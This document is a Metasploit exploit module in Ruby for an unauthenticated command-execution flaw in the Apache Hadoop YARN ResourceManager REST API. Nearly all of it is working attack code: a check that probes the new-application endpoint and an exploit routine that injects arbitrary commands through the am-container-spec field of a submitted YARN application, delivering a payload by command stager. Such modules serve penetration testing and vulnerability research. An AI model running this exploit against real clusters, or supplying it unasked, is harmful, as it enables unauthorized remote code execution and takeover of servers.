# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Hadoop YARN ResourceManager Unauthenticated Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an unauthenticated command execution vulnerability in Apache Hadoop through ResourceManager REST API.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;cbmixx&#039;,                            # Proof of concept
          &#039;Green-m <greenm.xxoo[at]gmail.com>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf&#039;],
          [&#039;URL&#039;, &#039;https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn&#039;]
        ],
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Oct 19 2016&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options([Opt::RPORT(8088)])
  end

  def check
    begin
      res = send_request_cgi(
        &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/ws/v1/cluster/apps/new-application&#039;),
        &#039;method&#039; => &#039;POST&#039;
      )
    rescue Rex::ConnectionError
      vprint_error("#{peer} - Connection failed")
      return CheckCode::Unknown
    end

    if res && res.code == 200 && res.body.include?(&#039;application-id&#039;)
      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  def exploit
    print_status(&#039;Sending Command&#039;)
    execute_cmdstager
  end

  def execute_command(cmd, opts = {})
    res = send_request_cgi(
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/ws/v1/cluster/apps/new-application&#039;),
      &#039;method&#039; => &#039;POST&#039;
    )

    app_id = res.get_json_document[&#039;application-id&#039;]

    post = {
      &#039;application-id&#039;    => app_id,
      &#039;application-name&#039;  => Rex::Text.rand_text_alpha_lower(4..12),
      &#039;application-type&#039;  => &#039;YARN&#039;,
      &#039;am-container-spec&#039; => {
        &#039;commands&#039;        => {&#039;command&#039; => cmd.to_s}
      }
    }

    send_request_cgi(
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/ws/v1/cluster/apps&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => post.to_json
    )
  end

end

